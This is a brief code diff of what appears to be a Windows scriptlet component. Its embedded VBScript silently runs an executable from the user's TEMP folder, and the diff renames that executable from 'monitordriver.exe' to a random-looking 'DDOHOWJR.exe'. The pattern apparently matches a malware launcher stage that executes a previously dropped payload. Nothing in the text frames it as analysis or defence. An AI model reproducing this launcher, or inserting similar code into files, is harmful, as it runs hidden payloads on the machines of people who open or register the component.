@@ -2,6 +2,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\monitordriver.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\DDOHOWJR.exe")
 </script>
 </component>
